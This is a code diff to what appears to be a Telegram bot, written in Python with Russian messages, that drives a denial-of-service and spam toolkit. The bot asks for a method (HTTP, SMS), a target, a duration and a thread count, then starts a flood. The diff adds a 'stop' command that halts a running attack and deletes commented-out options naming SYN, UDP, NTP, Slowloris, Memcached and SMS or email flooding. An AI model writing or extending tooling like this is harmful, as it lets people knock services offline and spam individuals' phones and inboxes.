@@ -16,42 +16,6 @@ from tools.method import AttackMethod
 
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
-# try:
-#     from tools.crash import CriticalError
-#     import tools.addons.clean
-#     import tools.addons.logo
-#     import tools.addons.winpcap
-#     from tools.method import AttackMethod
-# except ImportError as err:
-#     CriticalError("Failed import some modules", err)
-#     sys.exit(1)
-
-# Parse args
-# parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
-# parser.add_argument(
-#     "--target",
-#     type=str,
-#     metavar="<IP:PORT, URL, PHONE>",
-#     help="Target ip:port, url or phone",
-# )
-# parser.add_argument(
-#     "--method",
-#     type=str,
-#     metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
-#     help="Attack method",
-# )
-# parser.add_argument(
-#     "--time", type=int, default=10, metavar="<time>", help="time in secounds"
-# )
-# parser.add_argument(
-#     "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
-# )
-#
-# method = ''
-# threads = ''
-# time = ''
-# target = ''
-
 
 @dp.message_handler(commands='start')
 async def cmd_start(message: types.Message):
@@ -63,6 +27,12 @@ async def cmd_start(message: types.Message):
 async def get_method(message: types.Message):
     await message.answer('Введите метод (HTTP, SMS)')
     await SpamState.method.set()
+
+
+@dp.message_handler(lambda message: message.text == 'стоп'.lower())
+async def stop_atack(message: types.Message, state: FSMContext):
+    await state.reset_state()
+    await message.answer('Атака остановлена!')
 
 
 @dp.message_handler(state=SpamState.method)
@@ -108,7 +78,6 @@ async def add_threads(message: types.Message, state: FSMContext):
             duration=int(time), name=method, threads=int(threads), target=target
         ) as Flood:
             Flood.Start()
-
         await message.answer('✅Атака закончена!✅')
         await state.finish()
     except Exception:
